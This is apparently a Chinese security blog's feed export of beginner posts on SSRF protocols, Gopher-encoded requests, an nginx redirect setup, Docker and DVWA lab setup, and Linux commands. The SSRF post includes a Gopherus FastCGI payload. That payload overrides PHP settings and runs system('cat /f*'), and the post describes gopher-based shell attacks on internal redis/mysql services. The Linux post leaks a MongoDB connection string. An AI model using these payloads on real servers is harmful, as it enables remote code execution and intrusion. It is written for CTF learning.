协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，能用来探测端口的指纹信息<br>协议格式：<code>dict://&lt;host&gt;:&lt;port&gt;/&lt;dict-path&gt;</code><br>一般用<code>dict://&lt;host&gt;:&lt;port&gt;/info</code> 探测端口应用信息</p><p>举个栗子:</p><pre><code class="highlight plaintext">dict://127.0.0.1:6379 //探测redis是否存活dict://127.0.0.1:6379/info //探测端口应用信息</code></pre></blockquote><h4 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h4><p>必看原理 -&gt; <a href="https://blog.csdn.net/mysteryflower/article/details/94386461">附件文章在这里</a></p><p>简单来说利用Gopherus编写FastCGI，可以实现任意命令执行</p><p>比如：</p><pre><code class="highlight plaintext">&#123;    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,    &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;,    &#x27;SCRIPT_FILENAME&#x27;: &#x27;index.php&#x27;,    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,    &#x27;QUERY_STRING&#x27;: &#x27;&#x27;,    &#x27;REQUEST_URI&#x27;: &#x27;&#x27;,    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/&#x27;,    &#x27;SERVER_SOFTWARE&#x27;: &#x27;go / fcgiclient&#x27;,    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;REMOTE_PORT&#x27;: &#x27;&#x27;,    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,    &#x27;SERVER_PORT&#x27;: &#x27;9000&#x27;,    &#x27;SERVER_NAME&#x27;: &#x27;&#x27;,    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;,    &#x27;CONTENT_LENGTH&#x27;: &#x27;59&#x27;,    &#x27;PHP_VALUE&#x27;: &#x27;allow_url_include = On\ndisable_functions = \nauto_prepend_file = php://input&#x27;,    &#x27;POST_DATA&#x27;: &#x27;&lt;?php system(\&#x27;cat /f*\&#x27;);die(\&#x27;-----Made-by-SpyD3r-----\&#x27;);?&gt;&#x27;</code></pre><p>}</p><p>PHP_VALUE</p><p>这个部分用于设置PHP的配置指令。它可以通过FastCGI协议传递给PHP解释器，以覆盖默认的PHP配置</p><blockquote><ul><li><strong>allow_url_include &#x3D; On</strong>:<ul><li>允许使用URL作为<code>include</code>和<code>require</code>语句的目标。这意味着可以通过URL来包含远程文件。</li></ul></li><li><strong>disable_functions &#x3D;</strong>:<ul><li>禁用的PHP函数列表。在这里是空的，意味着没有禁用任何函数。</li></ul></li><li><strong>auto_prepend_file &#x3D; php:&#x2F;&#x2F;input</strong>:<ul><li>指定在每个请求开始时自动包含的文件。<code>php://input</code>是一个只读流，可以访问请求的原始POST数据。这里设置为<code>php://input</code>，意味着PHP会在处理请求之前读取并执行POST数据中的内容。</li></ul></li></ul></blockquote><p>POST_DATA</p><p>这个部分表示通过POST请求发送的数据。</p><p>经过一系列配合即可，不过要注意多次编码。</p><h4 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h4><p>怎么说呢，我都是用脚本</p><h3 id="DNS-rebinding"><a href="#DNS-rebinding" class="headerlink" title="DNS rebinding"></a>DNS rebinding</h3><p><a href="https://zhuanlan.zhihu.com/p/89426041">浅谈DNS重绑定漏洞 - 知乎 (zhihu.com)</a></p><p>工具：<a href="https://lock.cmpxchg8b.com/rebinder.html">rbndr.us dns rebinding service (cmpxchg8b.com)</a></p><blockquote><p>DNS重绑定DNS Rebinding攻击在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p></blockquote><h3 id="他人经验"><a href="#他人经验" class="headerlink" title="他人经验"></a>他人经验</h3><blockquote><p>虽然这篇文章都是基于CTF来分析SSRF相关知识的，但是我觉得可以从这些CTF题目中延伸出一些渗透攻击的思路。</p><p>就比如：如果我们发现一处SSRF，我们可以使用使用<code>file</code> 伪协议读取敏感信息，http&#x2F;s和dict<code>协议判断内网存活主机和端口，从端口判断内网中存在的服务。</code></p><p>当我们发现<code>redis/fastcgi/mysql</code>等服务时， 我们可以利用协议<code>gopher</code>和工具 <code>gopherus</code> 进行getshell。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Gopher入门</title>
      <link href="/2024/05/18/Gopher%E5%85%A5%E9%97%A8/"/>
      <url>/2024/05/18/Gopher%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-闲话"><a href="#0x00-闲话" class="headerlink" title="0x00 闲话"></a>0x00 闲话</h1><p>em，这估计就是我的风格了。Gopher广泛用于SSRF，不可不认真学。                                                                                                                                           </p><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/112055947">Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </a></p><h1 id="0x01-概况"><a href="#0x01-概况" class="headerlink" title="0x01 概况"></a>0x01 概况</h1><p>Gopher是互联网早期的一种协议。</p><blockquote><p>利用gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp 等，也可以发送 GET、POST 请求，这可以拓宽 SSRF 的攻击面。</p></blockquote><p>Gopher至少在PHP还是比较支持的。</p><h1 id="0x02-格式"><a href="#0x02-格式" class="headerlink" title="0x02 格式"></a>0x02 格式</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><pre><code class="highlight plaintext">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></pre><p>注意几点：</p><ul><li>gopher的默认端口是70</li><li>如果是post请求，回车换行要用到<code>%0d%0a</code>(post请求有几个必备请求头)</li><li>基于post请求，如果有多个参数，也要把<code>&amp;</code>进行URL编码</li></ul><h2 id="Gopher发送HTTP-GET请求"><a href="#Gopher发送HTTP-GET请求" class="headerlink" title="Gopher发送HTTP GET请求"></a>Gopher发送HTTP GET请求</h2><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><p>这里端口先开一个，姑且称之为num（已经有负载的端口不行哦）</p><p>监听：<code>nc -lvp num</code></p><p>发送：<code>gopher://555.555.555.555:num/_abcd</code></p><p>返回：<code>abcd</code></p><p>没错，第一个字符给弄没了，这个很好解决（解决的方法就是不解决）</p><h4 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h4><p>三步：</p><ol><li>构造HTTP数据包</li><li>URL编码、替换回车换行为%0d%0a</li><li>发送gopher协议</li></ol><p>注意事项：</p><ul><li>问号（？）需要转码为URL编码，也就是%3f</li><li>回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a</li><li>在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</li></ul><p>eg：</p><p>PHP代码</p><pre><code class="highlight php"><span class="meta">&lt;?php</span>    <span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>].<span class="string">&quot;\n&quot;</span><span class="meta">?&gt;</span></code></pre><p>请求：</p><pre><code class="highlight http"><span class="keyword">GET</span> <span class="string">/ssrf/get.php?name=haandsome</span> <span class="meta">HTTP/1.1</span><span class="attribute">Host</span><span class="punctuation">: </span>555.555.555.555</code></pre><p>构造请求包：</p><pre><code class="highlight plaintext">gopher://555.555.555.555/_GET /ssrf/get.php?name=handsome HTTP/1.1Host: 555.555.555.555</code></pre><p>编码（这里是一次的，一般情况下要两次，我还没搞懂）：</p><pre><code class="highlight plaintext">gopher://555.555.555.555:80/_GET%20/ssrf/base/get.php%3fname=Margin%20HTTP/1.1%0d%0AHost:%20192.168.0.109%0d%0A</code></pre><blockquote><p>tip： URL 编码中，<code>%0A</code> 和 <code>%0a</code> 实际上是表示相同的字符，即换行符。它们之间的区别在于大小写。在 URL 编码中，字母的大小写通常是不敏感的，因此 <code>%0A</code> 和 <code>%0a</code> 都会被解释为换行符。</p></blockquote><h2 id="Gopher发送HTTP-POST请求"><a href="#Gopher发送HTTP-POST请求" class="headerlink" title="Gopher发送HTTP POST请求"></a>Gopher发送HTTP POST请求</h2><p>格式：</p><pre><code class="highlight text">POST /ssrf/post.php HTTP/1.1host:555.555.555.555Content-Type:application/x-www-form-urlencodedContent-Length:11name=handsome</code></pre><p>这几个请求头不能少</p><p>写包：</p><pre><code class="highlight plaintext">gopher://555.555.555.555:80/_POST /ssrf/base/post.php HTTP/1.1Host:192.168.0.109Content-Type:application/x-www-form-urlencodedContent-Length:11name=Margin</code></pre><p>url编码（实际操作要两次）：</p><pre><code class="highlight plaintext">gopher://555.555.555.555:80/_POST%20%2Fssrf%2Fbase%2Fpost.php%20HTTP%2F1.1%0D%0AHost%3A555.555.555.555%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0A%0D%0Aname%3Dhandsome%0D%0A</code></pre><h2 id="SSRF-Gopher-URL编码两次"><a href="#SSRF-Gopher-URL编码两次" class="headerlink" title="SSRF Gopher URL编码两次"></a>SSRF Gopher URL编码两次</h2><p>推荐文章：</p><p><a href="https://blog.csdn.net/2202_75361164/article/details/137092879">https://blog.csdn.net/2202_75361164/article/details/137092879</a></p><p><a href="https://cloud.tencent.com/developer/article/2348163">https://cloud.tencent.com/developer/article/2348163</a></p><p>引用：</p><blockquote><p>传参经过多少次跳转就需要经过多少次url编码。 </p><p>直接curl后接gopher:&#x2F;&#x2F;就编码一次。 </p><p>利用?url&#x3D;gopher:&#x2F;&#x2F;就编码两次。 </p><p>还经过302跳转，就编码三次。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云服务器配置重定向文件</title>
      <link href="/2024/05/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%96%87%E4%BB%B6/"/>
      <url>/2024/05/18/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE%E9%87%8D%E5%AE%9A%E5%90%91%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-必要性"><a href="#0x00-必要性" class="headerlink" title="0x00 必要性"></a>0x00 必要性</h1><p>我还是喜欢在Blog唠嗑一下，虽然但是没什么人看。天生愚笨，此事耗时较久。但是安全一路本就是坎坷之途，越是困难越要战胜它。</p><p>附：我好奇问一下读者，作为一名hacker，你能从上面这段话收集多少信息。</p><h1 id="0x01-nginx配置"><a href="#0x01-nginx配置" class="headerlink" title="0x01 nginx配置"></a>0x01 nginx配置</h1><p>推荐视频：<br><a href="https://www.bilibili.com/video/BV1TZ421b7SD/?buvid=XXDF6E8DE20DA6F53F6CC5333D761BB13D2A1&from_spmid=tm.recommend.0.0&is_story_h5=false&mid=QHgqGMtTZKjaL9iy62qH+w==&p=1&plat_id=116&share_from=ugc&share_medium=android&share_plat=android&share_session_id=7bf31926-0363-48ac-9b29-906b6edc2662&share_source=QQ&share_tag=s_i&spmid=united.player-video-detail.0.0&timestamp=1713205026&unique_k=cgEOBK6&up_id=327247876&vd_source=d83686f059ea042739e28bbbc78335f3">Nginx入门必须懂3大功能配置 - Web服务器&#x2F;反向代理&#x2F;负载均衡_哔哩哔哩_bilibili</a></p><h2 id="一-基础理解"><a href="#一-基础理解" class="headerlink" title="一. 基础理解"></a>一. 基础理解</h2><p>我被一个文件和两个目录困扰</p><p><code>.../nginx.conf</code> 总配置文件 注意一行代码：</p><pre><code class="highlight plaintext">include .../sites-enabled/*;</code></pre><p><code>.../sites-enabled</code></p><p>很明显这个目录可以写配置</p><p><code>../sites-availabled</code></p><p>这个一般来说就不行了</p><p><a href="https://www.jianshu.com/p/42c4ffd044e6">https://www.jianshu.com/p/42c4ffd044e6</a></p><p>看不懂，先这样理解。</p><h2 id="二-配置代码理解"><a href="#二-配置代码理解" class="headerlink" title="二. 配置代码理解"></a>二. 配置代码理解</h2><p>在<code>enabled</code>下创建<code>port_handsome</code>(这只是一个名称.jpg)，代码如下：</p><pre><code class="highlight plaintext">sever&#123;listen port;sever_name IP;root /var/www/html;index 帅哥.php;location / &#123;try_files $uri $uri/ =404;&#125;location ~ \.php$ &#123;include snippets/fastcgi-php.conf;       fastcgi_pass unix:/var/run/php/php8.1-fpm.sock;  # 确保这里的版本号与安装的PHP版本匹配&#125;location ~ /\.ht &#123;        deny all;    &#125;&#125;</code></pre><h3 id="server-块"><a href="#server-块" class="headerlink" title="server 块"></a>server 块</h3><pre><code class="highlight nginx"><span class="section">server</span> &#123;</code></pre><p>这个块定义了一个虚拟服务器的配置，所有的配置指令都在这个块内。</p><h4 id="listen-指令"><a href="#listen-指令" class="headerlink" title="listen 指令"></a>listen 指令</h4><pre><code class="highlight nginx"><span class="attribute">listen</span> <span class="number">614</span>;</code></pre><p><code>listen</code> 指令指定Nginx监听的端口号。在这个例子中，Nginx将监听614端口。</p><h4 id="server-name-指令"><a href="#server-name-指令" class="headerlink" title="server_name 指令"></a>server_name 指令</h4><pre><code class="highlight nginx"><span class="attribute">server_name</span> IP;</code></pre><p><code>server_name</code> 指令指定了这个虚拟服务器的服务器名称或IP地址。在这个例子中，服务器名称是 <code>555.555.555.555</code>。</p><h4 id="root-指令"><a href="#root-指令" class="headerlink" title="root 指令"></a>root 指令</h4><pre><code class="highlight nginx"><span class="attribute">root</span> /var/www/html;</code></pre><p><code>root</code> 指令设置了服务器根目录。在这个例子中，根目录是 <code>/var/www/html</code>，即所有的请求文件都相对于这个目录。</p><h4 id="index-指令"><a href="#index-指令" class="headerlink" title="index 指令"></a>index 指令</h4><pre><code class="highlight nginx"><span class="attribute">index</span> <span class="literal">redirect</span>.php;</code></pre><p><code>index</code> 指令指定了默认的索引文件。在这个例子中，当访问根目录时，默认文件是 <code>redirect.php</code>。</p><h3 id="location-块"><a href="#location-块" class="headerlink" title="location &#x2F; 块"></a>location &#x2F; 块</h3><pre><code class="highlight nginx"><span class="section">location</span> / &#123;    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;&#125;</code></pre><p><code>location /</code> 块定义了对根路径的请求处理方式。<code>try_files</code> 指令尝试按顺序查找文件：</p><ol><li><code>$uri</code>：请求的URI。</li><li><code>$uri/</code>：请求的URI作为目录。</li><li><code>=404</code>：如果前两个都找不到，返回404错误。</li></ol><h3 id="location-php-块"><a href="#location-php-块" class="headerlink" title="location ~ .php$ 块"></a>location ~ .php$ 块</h3><pre><code class="highlight nginx"><span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;    <span class="attribute">include</span> snippets/fastcgi-php.conf;    <span class="attribute">fastcgi_pass</span> unix:/var/run/php/php8.1-fpm.sock;  <span class="comment"># 确保这里的版本号与安装的PHP版本匹配</span>&#125;</code></pre><p><code>location ~ \.php$</code> 块定义了对PHP文件的请求处理方式：</p><ol><li><code>include snippets/fastcgi-php.conf</code>：包含了FastCGI的配置片段。</li><li><code>fastcgi_pass unix:/var/run/php/php8.1-fpm.sock</code>：将PHP请求传递给PHP-FPM服务，通过Unix套接字通信。这里的版本号需要与实际安装的PHP版本匹配。</li></ol><h3 id="location-ht-块"><a href="#location-ht-块" class="headerlink" title="location ~ &#x2F;.ht 块"></a>location ~ &#x2F;.ht 块</h3><pre><code class="highlight nginx"><span class="section">location</span> <span class="regexp">~ /\.ht</span> &#123;    <span class="attribute">deny</span> all;&#125;</code></pre><p><code>location ~ /\.ht</code> 块定义了对以 <code>.ht</code> 开头的文件的请求处理方式：</p><ul><li><code>deny all</code>：拒绝所有访问。这通常用于保护 <code>.htaccess</code> 文件，不让它们被外部访问。</li></ul><h1 id="0x02-重定向代码"><a href="#0x02-重定向代码" class="headerlink" title="0x02 重定向代码"></a>0x02 重定向代码</h1><p>filename：R.php</p><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://555.555.555.555:555/R.php&quot;</span>);<span class="keyword">exit</span>()<span class="meta">?&gt;</span></code></pre><h1 id="0x03-善后"><a href="#0x03-善后" class="headerlink" title="0x03 善后"></a>0x03 善后</h1><p>检查配置是否错误：</p><pre><code class="highlight plaintext">nginx -t</code></pre><p> 重载：</p><pre><code class="highlight plaintext">systemctl reload nginx</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云服务器部署Docker及搭建各类环境</title>
      <link href="/2024/05/03/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2Docker%E5%8F%8A%E6%90%AD%E5%BB%BA%E5%90%84%E7%B1%BB%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/05/03/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2Docker%E5%8F%8A%E6%90%AD%E5%BB%BA%E5%90%84%E7%B1%BB%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Why"><a href="#0x00-Why" class="headerlink" title="0x00 Why"></a>0x00 Why</h1><p>为什么要搞服务器，为什么要学Docker，为什么要自己搭建靶场？这些都是基本功，逃避是没有用的。</p><h1 id="0x01-买服务器"><a href="#0x01-买服务器" class="headerlink" title="0x01 买服务器"></a>0x01 买服务器</h1><p>我买的是阿里云的服务器，贴个官网链接：<a href="https://cn.aliyun.com/">阿里云-计算，为了无法计算的价值 (aliyun.com)</a></p><h1 id="0x02-部署Docker"><a href="#0x02-部署Docker" class="headerlink" title="0x02 部署Docker"></a>0x02 部署Docker</h1><p>推荐教程：<a href="https://zhuanlan.zhihu.com/p/651148141?utm_id=0">最详细的ubuntu 安装 docker教程 - 知乎 (zhihu.com)</a></p><h2 id="一-卸载Ubuntu自带的Docker"><a href="#一-卸载Ubuntu自带的Docker" class="headerlink" title="一. 卸载Ubuntu自带的Docker"></a>一. 卸载Ubuntu自带的Docker</h2><p>以下操作最好用管理员</p><blockquote><p>注：docker的旧版本不一定被称为docker，<a href="https://link.zhihu.com/?target=http://docker.io">http://docker.io</a> 或 docker-engine也有可能，所以我们卸载的命令为：</p></blockquote><pre><code class="highlight bash">$ apt-get remove docker docker-engine docker.io containerd runc</code></pre><p>如果报错也正常，有些Ubuntu没有Docker，直接下一步。</p><h2 id="二-安装Docker及相关配置"><a href="#二-安装Docker及相关配置" class="headerlink" title="二. 安装Docker及相关配置"></a>二. 安装Docker及相关配置</h2><p>· 更新软件包和已安装的软件的版本：</p><pre><code class="highlight text">apt updateapt upgrade</code></pre><p>· 安装Docker依赖：</p><blockquote><p>Docker在Ubuntu上依赖一些软件包。执行以下命令来安装这些依赖:</p></blockquote><pre><code class="highlight text">apt-get install ca-certificates curl gnupg lsb-release</code></pre><p>· 添加Docker官方GPG密钥</p><blockquote><p>执行以下命令来添加Docker官方的GPG密钥:</p></blockquote><pre><code class="highlight text">curl -fsSL http://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</code></pre><p>· 添加Docker软件源</p><pre><code class="highlight text">add-apt-repository &quot;deb [arch=amd64] http://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable&quot;</code></pre><p>· 安装Docker（可算进入正题了）</p><pre><code class="highlight text">apt-get install docker-ce docker-ce-cli containerd.io</code></pre><p>· 配置用户组</p><blockquote><p>默认情况下，只有root用户和docker组的用户才能运行Docker命令。我们可以将当前用户添加到docker组，以避免每次使用Docker时都需要使用sudo。命令如下：</p></blockquote><pre><code class="highlight text">usermod -aG docker $USER</code></pre><blockquote><p><strong>注：重新登录才能使更改生效。</strong></p></blockquote><p>· 运行Docker</p><p>启动一下Docker看看有没有安装成功</p><pre><code class="highlight text">systemctl start docker</code></pre><p>· 安装工具（执行指令即可，原理我也不懂）</p><pre><code class="highlight text">apt-get -y install apt-transport-https ca-certificates curl software-properties-common</code></pre><p>· 重启Docker</p><pre><code class="highlight text">service docker restart</code></pre><p>· 验证是否成功</p><pre><code class="highlight text">docker run hello-world</code></pre><blockquote><p>因为我们之前没有拉取过<code>hello-world</code>，所以运行命令后会出现本地没有该镜像，并且会自动拉取的操作。</p></blockquote><p>· 查看镜像（image）</p><pre><code class="highlight text">docker images</code></pre><p>出现了<code>hello-world</code>的镜像即可</p><p>至此Docker部署成功，看推荐文章更好。</p><h1 id="0x03-搭建DVWA靶场"><a href="#0x03-搭建DVWA靶场" class="headerlink" title="0x03 搭建DVWA靶场"></a>0x03 搭建DVWA靶场</h1><p>推荐文章：<a href="https://juejin.cn/post/7076807703565336612">https://juejin.cn/post/7076807703565336612</a></p><h2 id="一-准备工作"><a href="#一-准备工作" class="headerlink" title="一. 准备工作"></a>一. 准备工作</h2><p>开端口：</p><p>打开控制台，安全组的管理规则开一个端口，假设为1314。然后连上服务器（我使用xshell）</p><p>启动Docker：</p><pre><code class="highlight plaintext">systemctl start docker</code></pre><h2 id="二-拉取image"><a href="#二-拉取image" class="headerlink" title="二.拉取image"></a>二.拉取image</h2><p>找image（镜像）</p><pre><code class="highlight plaintext">docker search dvwa</code></pre><p>选一个image拉取：</p><pre><code class="highlight plaintext">docker pull citizenstig/dvwa</code></pre><h2 id="三-布置容器"><a href="#三-布置容器" class="headerlink" title="三. 布置容器"></a>三. 布置容器</h2><pre><code class="highlight plaintext">docker images  *//查看镜像* docker run --name **Dvwa** -d -p 1314:80  citizenstig/dvwa  *//布置容器*-p：指定映射端口-d：后台运行--name：容器命名为XXX</code></pre><p>我端口是1314，后面的80不能改，容器里的php服务默认跑在80端口。</p><h2 id="四-后续"><a href="#四-后续" class="headerlink" title="四. 后续"></a>四. 后续</h2><p>在网页上打开，创建数据库，账户密码输入admin，password即可。</p><h1 id="0x04搭建CTF题目环境"><a href="#0x04搭建CTF题目环境" class="headerlink" title="0x04搭建CTF题目环境"></a>0x04搭建CTF题目环境</h1><h2 id="一-上传项目到服务器"><a href="#一-上传项目到服务器" class="headerlink" title="一. 上传项目到服务器"></a>一. 上传项目到服务器</h2><p>个人使用WinSCP，优点是可视化比较好，微软的可视化一向比较nice。自己mkdir一个目录储存项目即可。</p><h2 id="二-构建Docker镜像"><a href="#二-构建Docker镜像" class="headerlink" title="二. 构建Docker镜像"></a>二. 构建Docker镜像</h2><p>在 <code>Dockerfile</code> 所在目录下，打开终端或命令提示符，执行以下命令来构建 Docker 镜像：</p><pre><code class="highlight plaintext">docker build -t your-app-name .</code></pre><blockquote><p>这里的 <code>your-app-name</code> 是你给你的 Docker 镜像起的名字，<code>.</code> 指的是当前目录，即 Dockerfile 所在的目录。</p></blockquote><h2 id="三-运行Docker容器"><a href="#三-运行Docker容器" class="headerlink" title="三. 运行Docker容器"></a>三. 运行Docker容器</h2><p>镜像构建成功后，执行以下指令创建容器：</p><pre><code class="highlight plaintext">docker run --name [取个名字] -d -p 1234:80 your-app-name</code></pre><h2 id="四-后续-1"><a href="#四-后续-1" class="headerlink" title="四.后续"></a>四.后续</h2><p>登录网页即可验证。</p><h1 id="0x05-删除容器和镜像"><a href="#0x05-删除容器和镜像" class="headerlink" title="0x05 删除容器和镜像"></a>0x05 删除容器和镜像</h1><h2 id="·-先删除正在运行的容器"><a href="#·-先删除正在运行的容器" class="headerlink" title="· 先删除正在运行的容器"></a>· 先删除正在运行的容器</h2><p>查看正在运行的容器：</p><pre><code class="highlight plaintext">docker ps</code></pre><p>停止正在运行的容器：</p><pre><code class="highlight shell">docker stop &lt;容器ID或名称&gt;</code></pre><p>删除目标容器：</p><pre><code class="highlight plaintext">docker rm  &lt;容器ID或名称&gt;</code></pre><h2 id="·-再删除目标镜像"><a href="#·-再删除目标镜像" class="headerlink" title="· 再删除目标镜像"></a>· 再删除目标镜像</h2><p>查看镜像：</p><pre><code class="highlight plaintext">docker images</code></pre><p>删除镜像：</p><pre><code class="highlight none">docker rmi IMAGE_ID</code></pre>]]></content>
      
      
      <categories>
          
          <category> 环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 入门</title>
      <link href="/2024/03/18/Linux-%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/Linux-%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>总觉得学的不扎实，认真学一次。</p><p>mongodb+srv:&#x2F;&#x2F;2472373483:<password>@pax-blog.fu8mfyq.mongodb.net&#x2F;?retryWrites&#x3D;true&amp;w&#x3D;majority&amp;appName&#x3D;pax-blog</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>概述：</p><blockquote><p>Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统。</p></blockquote><p>系统启动进程：</p><ul><li>内核的引导。</li><li>运行 init。</li><li>系统初始化。</li><li>建立终端 。</li><li>用户登录系统。</li></ul><p>目录结构：</p><p>由根目录出发的树状目录结构。</p><p>查阅：<a href="https://www.runoob.com/linux/linux-system-contents.html">https://www.runoob.com/linux/linux-system-contents.html</a></p><hr><h2 id="目录与文件管理"><a href="#目录与文件管理" class="headerlink" title="目录与文件管理"></a>目录与文件管理</h2><h3 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h3><blockquote><ul><li><p><strong>绝对路径：</strong><br>路径的写法，由根目录 <strong>&#x2F;</strong> 写起，例如： &#x2F;usr&#x2F;share&#x2F;doc 这个目录。</p></li><li><p><strong>相对路径：</strong><br>路径的写法，不是由 <strong>&#x2F;</strong> 写起，例如由 &#x2F;usr&#x2F;share&#x2F;doc 要到 &#x2F;usr&#x2F;share&#x2F;man 底下时，可以写成： <strong>cd ..&#x2F;man</strong> 这就是相对路径的写法。</p></li></ul></blockquote><p>很好理解，简单来说就是开头目录是谁而已。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><h4 id="ls-列出目录"><a href="#ls-列出目录" class="headerlink" title="ls(列出目录)"></a><strong>ls</strong>(列出目录)</h4><p>参数：</p><ul><li>-a ：全部的文件，连同隐藏文件( 开头为 . 的文件) 一起列出来(常用)</li><li>-d ：仅列出目录本身，而不是列出目录内的文件数据(常用)</li><li>-l ：长数据串列出，包含文件的属性与权限等等数据；(常用)</li></ul><h4 id="cd-切换目录"><a href="#cd-切换目录" class="headerlink" title="cd(切换目录)"></a><strong>cd</strong>(切换目录)</h4><h4 id="pwd-显示当前目录"><a href="#pwd-显示当前目录" class="headerlink" title="pwd(显示当前目录)"></a><strong>pwd</strong>(显示当前目录)</h4><p>参数：</p><ul><li>-P ：显示出确实的路径，而非使用链接 (link) 路径。</li></ul><blockquote><p>实例显示出实际的工作目录，而非链接档本身的目录名而已。</p></blockquote><h4 id="mkdir-创建新目录"><a href="#mkdir-创建新目录" class="headerlink" title="mkdir (创建新目录)"></a><strong>mkdir</strong> (创建新目录)</h4><p>参数：</p><ul><li>-m ：直接配置文件的权限</li><li>-p ：将所需要的目录(包含上一级目录)递归创建起来</li></ul><h4 id="rmdir-删除空的目录"><a href="#rmdir-删除空的目录" class="headerlink" title="rmdir(删除空的目录)"></a><strong>rmdir</strong>(删除空的目录)</h4><p>参数：</p><ul><li>-p ：从该目录起，一次删除多级空目录</li></ul><p><strong>cp</strong>(复制文件或目录)</p><p>语法：</p><pre><code class="highlight plaintext">cp -p from to</code></pre><h4 id="rm-移除文件或目录"><a href="#rm-移除文件或目录" class="headerlink" title="rm(移除文件或目录)"></a><strong>rm</strong>(移除文件或目录)</h4><p>参数：</p><ul><li>-f ：就是 force 的意思，忽略不存在的文件，不会出现警告信息；</li><li>-i ：互动模式，在删除前会询问使用者是否动作</li><li>-r ：递归删除啊！最常用在目录的删除了！这是非常危险的选项！！！</li></ul><h4 id="mv-移动文件与目录，或修改名称"><a href="#mv-移动文件与目录，或修改名称" class="headerlink" title="mv (移动文件与目录，或修改名称)"></a><strong>mv</strong> (移动文件与目录，或修改名称)</h4><p>语法：</p><pre><code class="highlight plaintext">mv -p from to</code></pre><p>选项与参数：</p><ul><li>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖；</li><li>-i ：若目标文件 (destination) 已经存在时，就会询问是否覆盖！</li><li>-u ：若目标文件已经存在，且 source 比较新，才会升级 (update)</li></ul><h4 id="文件查看"><a href="#文件查看" class="headerlink" title="文件查看"></a>文件查看</h4><ul><li>cat 由第一行开始显示文件内容</li><li>tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写！</li><li>nl  显示的时候，顺道输出行号！</li><li>more 一页一页的显示文件内容</li><li>less 与 more 类似，但是比 more 更好的是，他可以往前翻页！</li><li>head 只看头几行</li><li>tail 只看尾巴几行</li></ul><h2 id="用户与用户组管理"><a href="#用户与用户组管理" class="headerlink" 